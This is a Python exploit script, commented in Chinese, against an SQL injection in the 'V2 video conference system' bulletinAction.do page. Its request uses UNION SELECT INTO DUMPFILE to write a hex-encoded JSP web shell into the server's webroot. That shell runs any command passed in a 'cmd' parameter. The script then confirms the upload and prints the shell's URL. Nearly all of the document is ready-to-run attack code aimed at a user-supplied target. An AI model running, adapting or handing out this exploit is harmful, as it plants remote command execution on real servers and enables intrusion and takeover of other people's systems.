#!/usr/bin/env python
# -*- coding:utf-8 -*-
# V2视频会议系统 bulletinAction.do SQL注入漏洞 EXP
# Author:CF_HB
# 时间：2016年6月6日
# 漏洞参考地址: http://www.wooyun.org/bugs/wooyun-2015-0143276
## exp : http://xxx.xxx.xxx.xxx/xx/V2ConferenceCmd.jsp?cmd=whoami

import requests
import argparse
from urlparse import urlparse, urlunparse
import time

banner = u'''\
# V2视频会议系统 bulletinAction.do SQL注入漏洞 EXP
# Author:CF_HB
# 时间：2016年6月6日
# 漏洞参考地址: http://www.wooyun.org/bugs/wooyun-2015-0143276
# exp : http://xxx.xxx.xxx.xxx/xx/V2ConferenceCmd.jsp?cmd=whoami
    python exp.py -u http://xxx.xxx.xxx.xxx/xx/
'''


def getshell(url):
    exp = "/Conf/jsp/systembulletin/bulletinAction.do?operator=modify&sysId=1 UNION SELECT 1,2,3,4,0x497420776F726B7321DA3C2540207061676520636F6E74656E74547970653D22746578742F68746D6C3B20636861727365743D47424B2220253EDA3C2540207061676520696D706F72743D226A6176612E696F2E2A2220253E203C2520537472696E6720636D64203D20726571756573742E676574506172616D657465722822636D6422293B20537472696E67206F7574707574203D2022223B20696628636D6420213D206E756C6C29207B20537472696E672073203D206E756C6C3B20747279207B2050726F636573732070203D2052756E74696D652E67657452756E74696D6528292E6578656328636D64293B204275666665726564526561646572207349203D206E6577204275666665726564526561646572286E657720496E70757453747265616D52656164657228702E676574496E70757453747265616D282929293B207768696C65282873203D2073492E726561644C696E6528292920213D206E756C6C29207B206F7574707574202B3D2073202B225C725C6E223B207D207D20636174636828494F457863657074696F6E206529207B20652E7072696E74537461636B547261636528293B207D207DDA6F75742E7072696E746C6E286F7574707574293B253EDA into dumpfile '../../management/webapps/root/V2ConferenceCmd.jsp'%23"
    urlinfo = urlparse(url)
    check_url = urlunparse((urlinfo.scheme, urlinfo.netloc, '/V2ConferenceCmd.jsp', '', '', ''))
    temp = urlunparse((urlinfo.scheme, urlinfo.netloc, '', '', '', ''))
    exp_url = temp + exp
    try:
        print "[checking] " + url
        req = requests.session()
        resp_one = req.get(exp_url, timeout=5)
        time.sleep(1)
        if resp_one.status_code == 200:
            resp_two = req.get(check_url, timeout=5)
            if resp_two.status_code == 200 and "It works!" in resp_two.content:
                print "[getshell success]"
                print "SHELL: "+check_url
                return
        print u"getshell failed..."
        return
    except Exception, e:
        print "Failed to connection target, try again.."
parser = argparse.ArgumentParser()
parser.add_argument('-u', help='the target url.')
args = parser.parse_args()
args_dict = args.__dict__
try:
    if not (args_dict['u'] == None):
        url = args_dict['u']
        print banner
        getshell(url)
except Exception,e:
    print parser.print_usage()
    exit(-1)
